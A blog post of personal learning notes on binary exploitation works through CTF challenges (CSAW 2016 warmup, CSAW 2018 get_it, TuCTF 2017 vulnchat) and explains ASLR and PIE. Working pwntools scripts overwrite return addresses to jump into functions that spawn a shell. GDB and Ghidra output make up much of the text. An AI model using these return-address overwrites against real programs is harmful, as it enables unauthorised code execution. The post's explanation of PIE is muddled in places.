---
title: "Learning Bin Exp from Scratch 03"
date: "2024-05-27T11:59:59.999Z"
description: "Stack Buffer Overflows Pt 2"
author: "ZyphenSVC"
slug: "posts/binexp/2023-05-27-binexp"
---

> Forenote

I'm bored... Might as well become a god of binary exploitation.

This would not be possible if it wasnt for [Nightmare by guyinatuxedo](https://guyinatuxedo.github.io/index.html). This series is a compilation of my summarized notes and remarks done by me and me alone.

# Call Function Overflows

## CSAW 2016 Warmup

```bash
$ ./warmup
-Warm Up-
WOW:0x40060d
>d

$ file warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped

$ checksec warmup
[*] '/mnt/e/downloads/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```c
void main(void)

{
  char flagvar [64];
  char input [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&WarmUp,4);
  sprintf(flagvar,"%p\n",flag);
  write(1,flagvar,9);
  write(1,&">",1);
  gets(input);
  return;
}
```

```armasm
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall main(void)
             undefined         AL:1           <RETURN>
             undefined1[64]    Stack[-0x48]   input                                   XREF[1]:     00400692(*)  
             undefined1[64]    Stack[-0x88]   flagvar                                 XREF[2]:     0040064d(*), 
                                                                                                   00400668(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:0040053d(*), 0040077c, 
                                                                                          00400830(*)  
        0040061d 55              PUSH       RBP

```

This uses a new idea which I got lost at for a while. From what I understand, we basically have to change the return address of the main function. Therefore instead of changing a variable value, we are changing the return value itself. Thus we need to see the offset of the return function. 

```armasm
        00400692 48 8d 45 c0     LEA        RAX=>input,[RBP + -0x40]
        00400696 48 89 c7        MOV        RDI,RAX
        00400699 b8 00 00        MOV        EAX,0x0
                 00 00
        0040069e e8 5d fe        CALL       <EXTERNAL>::gets                                 char * gets(char * __s)
                 ff ff
        004006a3 c9              LEAVE
        004006a4 c3              RET
```

IN GDB:

```armasm
gef➤  b *0x00000000004006a3
Breakpoint 1 at 0x4006a3
gef➤  r
Starting program: /mnt/e/downloads/warmup
-Warm Up-
WOW:0x40060d
>aaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x00000000004006a3 in main ()
/home/zyphen/.gdbinit-gef.py:2488: DeprecationWarning: invalid escape sequence '\ÿ'
  res = gdb.Value(address).cast(char_ptr).string(encoding=encoding, length=length).strip()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffffffed820  →  "aaaaaaaaaaaaaaaaaaaaaa"
$rbx   : 0x00000000004006b0  →  <__libc_csu_init+0> push r15
$rcx   : 0x00007fffff78c980  →  0x00000000fbad2288
$rdx   : 0x0
$rsp   : 0x00007ffffffed7e0  →  "0x40060d\n"
$rbp   : 0x00007ffffffed860  →  0x0000000000000000
$rsi   : 0x00000000006022a1  →  "aaaaaaaaaaaaaaaaaaaaa\n"
$rdi   : 0x00007fffff78e7f0  →  0x0000000000000000
$rip   : 0x00000000004006a3  →  <main+134> leave
$r8    : 0x00007ffffffed820  →  "aaaaaaaaaaaaaaaaaaaaaa"
$r9    : 0x0
$r10   : 0x00007fffff78cbe0  →  0x00000000006024a0  →  0x0000000000000000
$r11   : 0x00007fffff78cbe0  →  0x00000000006024a0  →  0x0000000000000000
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffffffed950  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffffffed7e0│+0x0000: "0x40060d\n"         ← $rsp
0x00007ffffffed7e8│+0x0008: 0x000000000000000a
0x00007ffffffed7f0│+0x0010: 0x0000000000000000
0x00007ffffffed7f8│+0x0018: 0x0000000000000000
0x00007ffffffed800│+0x0020: 0x0000000000400040  →   (bad)
0x00007ffffffed808│+0x0028: 0x0000000000000009
0x00007ffffffed810│+0x0030: 0x00007ffffffed880  →  0x00000001ff7887a0
0x00007ffffffed818│+0x0038: 0x00007ffffffedb90  →  0x2f0034365f363878 ("x86_64"?)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400696 <main+121>       mov    rdi, rax
     0x400699 <main+124>       mov    eax, 0x0
     0x40069e <main+129>       call   0x400500 <gets@plt>
 →   0x4006a3 <main+134>       leave
     0x4006a4 <main+135>       ret
     0x4006a5                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x4006af                  nop
     0x4006b0 <__libc_csu_init+0> push   r15
     0x4006b2 <__libc_csu_init+2> mov    r15d, edi
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped 0x4006a3 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a3 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern aaaaaaaaaaaaaaaaaaaaaa
[+] Searching 'aaaaaaaaaaaaaaaaaaaaaa' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6022a0 - 0x6022b8  →   "aaaaaaaaaaaaaaaaaaaaaa\n"
[+] In '[stack]'(0x7fffff7ef000-0x7ffffffef000), permission=rw-
  0x7ffffffed820 - 0x7ffffffed836  →   "aaaaaaaaaaaaaaaaaaaaaa"
gef➤  i r
rax            0x7ffffffed820      0x7ffffffed820
rbx            0x4006b0            0x4006b0
rcx            0x7fffff78c980      0x7fffff78c980
rdx            0x0                 0x0
rsi            0x6022a1            0x6022a1
rdi            0x7fffff78e7f0      0x7fffff78e7f0
rbp            0x7ffffffed860      0x7ffffffed860
rsp            0x7ffffffed7e0      0x7ffffffed7e0
r8             0x7ffffffed820      0x7ffffffed820
r9             0x0                 0x0
r10            0x7fffff78cbe0      0x7fffff78cbe0
r11            0x7fffff78cbe0      0x7fffff78cbe0
r12            0x400520            0x400520
r13            0x7ffffffed950      0x7ffffffed950
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x4006a3            0x4006a3 <main+134>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
gef➤  i f
Stack level 0, frame at 0x7ffffffed870:
 rip = 0x4006a3 in main; saved rip = 0x7fffff5c4083
 Arglist at 0x7ffffffed860, args:
 Locals at 0x7ffffffed860, Previous frame's sp is 0x7ffffffed870
 Saved registers:
  rbp at 0x7ffffffed860, rip at 0x7ffffffed868
```

Thus the position of the gets function to the return function is taking the starting value at `0x7ffffffed820` and finding the end of the `leave` call, which is `0x7ffffffed868`. Offset is thus 72 bytes.

I ran into a couple of problems with the directing the start of the easy function straight to its starting point. I figure this has to deal with pushing rbp to memory which leads to sigkill. So I chose the address right afterwards.

```armasm
gef➤  disas easy
Dump of assembler code for function easy:
   0x000000000040060d <+0>:     push   rbp
   0x000000000040060e <+1>:     mov    rbp,rsp
   0x0000000000400611 <+4>:     mov    edi,0x400734
   0x0000000000400616 <+9>:     call   0x4004d0 <system@plt>
   0x000000000040061b <+14>:    pop    rbp
=> 0x000000000040061c <+15>:    ret
End of assembler dump.
```

I chose `0x40060e` as my starting point for context.

```python
from pwn import *

target = process("./warmup")

offset = 72

p = b"a"*offset + p64(0x40060e)

target.send(p)
target.interactive()
```

```bash
$ python3 ape.py
[+] Starting local process './warmup': pid 1313
[*] Switching to interactive mode
-Warm Up-
WOW:0x40060d
>$
TWCTF{pwnable_warmup_I_did_it!}
[*] Process './warmup' stopped with exit code -11 (SIGSEGV) (pid 1313)
[*] Got EOF while reading in interactive
$
[*] Got EOF while sending in interactive
```

Took a lot of debugging with the program.

## CSAW 2018 Get It

In ghidra:

```c
int main(void)

{
  char input [32];
  
  puts("Do you gets it??");
  gets(input);
  return 0;
}
```

Seems easy enough.

```armasm
gef➤  i f
Stack level 0, frame at 0x7ffffffed860:
 rip = 0x4005f6 in main; saved rip = 0x7fffff5c4083
 Arglist at 0x7ffffffed850, args:
 Locals at 0x7ffffffed850, Previous frame's sp is 0x7ffffffed860
 Saved registers:
  rbp at 0x7ffffffed850, rip at 0x7ffffffed858
gef➤  search-pattern aaaaaaaa
[+] Searching 'aaaaaaaa' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6024b0 - 0x6024ba  →   "aaaaaaaa\n"
[+] In '[stack]'(0x7fffff7ef000-0x7ffffffef000), permission=rw-
  0x7ffffffed830 - 0x7ffffffed838  →   "aaaaaaaa"
```

```python
$ python
Python 3.8.10 (default, Nov 22 2023, 10:22:35)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7ffffffed858 - 0x7ffffffed830
40
>>>
```

Offset 40.

```armasm
gef➤  disas give_shell
Dump of assembler code for function give_shell:
   0x00000000004005b6 <+0>:     push   rbp
   0x00000000004005b7 <+1>:     mov    rbp,rsp
   0x00000000004005ba <+4>:     mov    edi,0x400684
   0x00000000004005bf <+9>:     call   0x400480 <system@plt>
   0x00000000004005c4 <+14>:    nop
   0x00000000004005c5 <+15>:    pop    rbp
   0x00000000004005c6 <+16>:    ret
End of assembler dump.
gef➤  quit
```

Choosing `give_shell+1` as my return location.

```bash
$ python ape.py
[+] Starting local process './get_it': pid 1414
[*] Switching to interactive mode
Do you gets it??
$
$ echo helloworld
helloworld
$
```

Easy challenge from what I learned previously.

## TuCTF 2017 vulnchat

```bash
$ ./vuln-chat
----------- Welcome to vuln-chat -------------
Enter your username: d
Welcome d!
Connecting to 'djinn'
d
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
d: djinn: Sorry. That''s not good enough

$ file vuln-chat
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped

$ checksec vuln-chat
[*] '/mnt/e/downloads/vuln-chat'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```c
int main(void)

{
  undefined key [20];
  char input [20];
  int formatstr;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  formatstr = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&formatstr,input);
  printf("Welcome %s!\n",input);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",input);
  __isoc99_scanf(&formatstr,key);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```

```armasm
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined4 __cdecl main(void)
             undefined4        EAX:4          <RETURN>
             undefined1        Stack[-0x5]:1  local_5                                 XREF[1]:     080485c5(W)  
             undefined4        Stack[-0x9]:4  formatstr                               XREF[3]:     080485be(W), 
                                                                                                   080485cd(*), 
                                                                                                   08048630(*)  
             undefined1[20]    Stack[-0x1d]   input                                   XREF[3]:     080485c9(*), 
                                                                                                   080485d9(*), 
                                                                                                   0804861b(*)  
             undefined1[20]    Stack[-0x31]   key                                     XREF[1]:     0804862c(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:08048487(*), 08048830, 
                                                                                          080488ac(*)  
        0804858a 55              PUSH       EBP

```

We have to override the format string and then overflow from key to the return address. From the format string to the input, we have a 20 byte difference, and then we can reset the format specfier from there.

```python
from pwn import *

context.log_level='warn'

for i in range(20,91):
    target = process("./vuln-chat")
    offset = i
    print(i)
    p = b"a"*20 + b"%99s\n"
    p += b"b"*i + p32(0x804856c)
    target.sendline(p)
    target.recvuntil(b"Sorry. That's not good enough\n")
    target.interactive()
```

```bash
$
46
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
$
47
$
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
$
48
$
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
$
49
$
TWCTF{pwnable_warmup_I_did_it!}
Use it wisely
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
$
50
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
$
[5]+  Stopped                 python3 ape.py
```

It's a little brute forcy for the second offset, but I personally didnt know any other way. My GDB on WSL doesn't like to act nice with 32 bit programs. Probably will have to switch to vms.

When reading the guide they found the second offset the normal way which is `0x31` or `49` bytes as well.

# ASLR

These two are a form of mitigation that program developers can do to prevent people from breaking in. 

ASLR stands for address space randomization in a sense. Generally each memory address is associated with a byte of code when executed. ASLR randomizes this memory location to prevent static binaries per each launch of the program.

The way we can bypass this is by leaking an address from a memory region that we want to know what the address space is. Meaning we can look at the memory mappings of a process with vmmap.

```armasm
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x00000000023b9000 0x00000000023da000 0x0000000000000000 rw- [heap]
0x00007ff338df3000 0x00007ff338e18000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ff338e18000 0x00007ff338f8b000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ff338f8b000 0x00007ff338fd4000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ff338fd4000 0x00007ff338fd7000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ff338fd7000 0x00007ff338fda000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ff338fda000 0x00007ff338fe0000 0x0000000000000000 rw-
0x00007ff338ff6000 0x00007ff338ff7000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ff338ff7000 0x00007ff339018000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ff339018000 0x00007ff339020000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ff339020000 0x00007ff339021000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ff339021000 0x00007ff339022000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ff339022000 0x00007ff339023000 0x0000000000000000 rw-
0x00007ffcdc7ab000 0x00007ffcdc7cc000 0x0000000000000000 rw- [stack]
0x00007ffcdc7d3000 0x00007ffcdc7d6000 0x0000000000000000 r-- [vvar]
0x00007ffcdc7d6000 0x00007ffcdc7d7000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

This is how this looks.

We can see various memory regions such as the heap, stack, libc, and more. Even though the address in memory change, whats important is that the offset is static. So if we find one single memory address, we know where everything else is in proximity to that one address. An offset!

Note this sounds great, but it is important to note that these proximal mappings are only good to adhering parent of the memory address. Meaning an address in libc wont be able to affect the heap or stack.

# PIE

PIE stands for Position Independent Executable. Similar to ASLR for the memory regions and code itself. Meaning the instruction addresses are fixed, but not the memory regions like libc, heap, and stack.

This is done by creating a new starting point in memory, a base offset, of where the program will start. Then everything is executed in this base offset and the offset of the start code.

Before PIE:

```armasm
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401132 <+0>:    push   rbp
   0x0000000000401133 <+1>:    mov    rbp,rsp
   0x0000000000401136 <+4>:    sub    rsp,0x20
   0x000000000040113a <+8>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401143 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401147 <+21>:    xor    eax,eax
   0x0000000000401149 <+23>:    mov    rdx,QWORD PTR [rip+0x2ef0]        # 0x404040 <stdin@@GLIBC_2.2.5>
   0x0000000000401150 <+30>:    lea    rax,[rbp-0x12]
   0x0000000000401154 <+34>:    mov    esi,0x9
   0x0000000000401159 <+39>:    mov    rdi,rax
   0x000000000040115c <+42>:    call   0x401040 <fgets@plt>
=> 0x0000000000401161 <+47>:    mov    DWORD PTR [rbp-0x18],0x5
   0x0000000000401168 <+54>:    nop
   0x0000000000401169 <+55>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040116d <+59>:    xor    rax,QWORD PTR fs:0x28
   0x0000000000401176 <+68>:    je     0x40117d <main+75>
   0x0000000000401178 <+70>:    call   0x401030 <__stack_chk_fail@plt>
   0x000000000040117d <+75>:    leave  
   0x000000000040117e <+76>:    ret    
End of assembler dump.
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

With PIE:

```armasm
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001145 <+0>:    push   rbp
   0x0000000000001146 <+1>:    mov    rbp,rsp
   0x0000000000001149 <+4>:    sub    rsp,0x20
   0x000000000000114d <+8>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001156 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000115a <+21>:    xor    eax,eax
   0x000000000000115c <+23>:    mov    rdx,QWORD PTR [rip+0x2ead]        # 0x4010 <stdin@@GLIBC_2.2.5>
   0x0000000000001163 <+30>:    lea    rax,[rbp-0x12]
   0x0000000000001167 <+34>:    mov    esi,0x9
   0x000000000000116c <+39>:    mov    rdi,rax
   0x000000000000116f <+42>:    call   0x1040 <fgets@plt>
   0x0000000000001174 <+47>:    mov    DWORD PTR [rbp-0x18],0x5
   0x000000000000117b <+54>:    nop
   0x000000000000117c <+55>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000001180 <+59>:    xor    rax,QWORD PTR fs:0x28
   0x0000000000001189 <+68>:    je     0x1190 <main+75>
   0x000000000000118b <+70>:    call   0x1030 <__stack_chk_fail@plt>
   0x0000000000001190 <+75>:    leave  
   0x0000000000001191 <+76>:    ret    
End of assembler dump.
gef➤  vmmap
Start              End                Offset             Perm Path
0x000055ce0fb38000 0x000055ce0fb39000 0x0000000000000000 r-- /tmp/try
0x000055ce0fb39000 0x000055ce0fb3a000 0x0000000000001000 r-x /tmp/try
0x000055ce0fb3a000 0x000055ce0fb3b000 0x0000000000002000 r-- /tmp/try
0x000055ce0fb3b000 0x000055ce0fb3c000 0x0000000000002000 r-- /tmp/try
0x000055ce0fb3c000 0x000055ce0fb3d000 0x0000000000003000 rw- /tmp/try
0x000055ce0fb5a000 0x000055ce0fb7b000 0x0000000000000000 rw- [heap]
0x00007fb90e941000 0x00007fb90e966000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007fb90e966000 0x00007fb90ead9000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007fb90ead9000 0x00007fb90eb22000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007fb90eb22000 0x00007fb90eb25000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007fb90eb25000 0x00007fb90eb28000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007fb90eb28000 0x00007fb90eb2e000 0x0000000000000000 rw-
0x00007fb90eb44000 0x00007fb90eb45000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007fb90eb45000 0x00007fb90eb66000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007fb90eb66000 0x00007fb90eb6e000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007fb90eb6e000 0x00007fb90eb6f000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007fb90eb6f000 0x00007fb90eb70000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007fb90eb70000 0x00007fb90eb71000 0x0000000000000000 rw-
0x00007fff45acc000 0x00007fff45aed000 0x0000000000000000 rw- [stack]
0x00007fff45b19000 0x00007fff45b1c000 0x0000000000000000 r-- [vvar]
0x00007fff45b1c000 0x00007fff45b1d000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

So how do we use breakpoints with this new mitigation? We can use something called `pie` commands, which is the exact same thing as using regular commands but with `pie` prepended.

```armasm
gef➤  pie b *0x116f
gef➤  pie run
Stopped due to shared library event (no libraries added or removed)

Breakpoint 1, 0x000055555555516f in main ()
[+] base address 0x555555554000
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdfde  →  0x7fffffffe0d00000
$rbx   : 0x0               
$rcx   : 0x00005555555551a0  →  <__libc_csu_init+0> push r15
$rdx   : 0x00007ffff7fafa00  →  0x00000000fbad2088
$rsp   : 0x00007fffffffdfd0  →  0x00005555555551a0  →  <__libc_csu_init+0> push r15
$rbp   : 0x00007fffffffdff0  →  0x00005555555551a0  →  <__libc_csu_init+0> push r15
$rsi   : 0x9               
$rdi   : 0x00007fffffffdfde  →  0x7fffffffe0d00000
$rip   : 0x000055555555516f  →  <main+42> call 0x555555555040 <fgets@plt>
$r8    : 0x00007ffff7fb1a40  →  0x0000000000000000
$r9    : 0x00007ffff7fb1a40  →  0x0000000000000000
$r10   : 0x7               
$r11   : 0x2               
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe0d0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfd0│+0x0000: 0x00005555555551a0  →  <__libc_csu_init+0> push r15 ← $rsp
0x00007fffffffdfd8│+0x0008: 0x0000555555555060  →  <_start+0> xor ebp, ebp
0x00007fffffffdfe0│+0x0010: 0x00007fffffffe0d0  →  0x0000000000000001
0x00007fffffffdfe8│+0x0018: 0xdb3c67cc21531d00
0x00007fffffffdff0│+0x0020: 0x00005555555551a0  →  <__libc_csu_init+0> push r15 ← $rbp
0x00007fffffffdff8│+0x0028: 0x00007ffff7df1b6b  →  <__libc_start_main+235> mov edi, eax
0x00007fffffffe000│+0x0030: 0x0000000000000000
0x00007fffffffe008│+0x0038: 0x00007fffffffe0d8  →  0x00007fffffffe3f9  →  "/tmp/try"
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555163 <main+30>        lea    rax, [rbp-0x12]
   0x555555555167 <main+34>        mov    esi, 0x9
   0x55555555516c <main+39>        mov    rdi, rax
 → 0x55555555516f <main+42>        call   0x555555555040 <fgets@plt>
   ↳  0x555555555040 <fgets@plt+0>    jmp    QWORD PTR [rip+0x2f8a]        # 0x555555557fd0 <fgets@got.plt>
      0x555555555046 <fgets@plt+6>    push   0x1
      0x55555555504b <fgets@plt+11>   jmp    0x555555555020
      0x555555555050 <__cxa_finalize@plt+0> jmp    QWORD PTR [rip+0x2fa2]        # 0x555555557ff8
      0x555555555056 <__cxa_finalize@plt+6> xchg   ax, ax
      0x555555555058                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────── arguments (guessed) ────
fgets@plt (
   $rdi = 0x00007fffffffdfde → 0x7fffffffe0d00000,
   $rsi = 0x0000000000000009,
   $rdx = 0x00007ffff7fafa00 → 0x00000000fbad2088
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "try", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555516f → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Then you can just treat this exactly the same way as ASLR as the offsets remain the same everytime, just per each memory region.

See you tomorrow.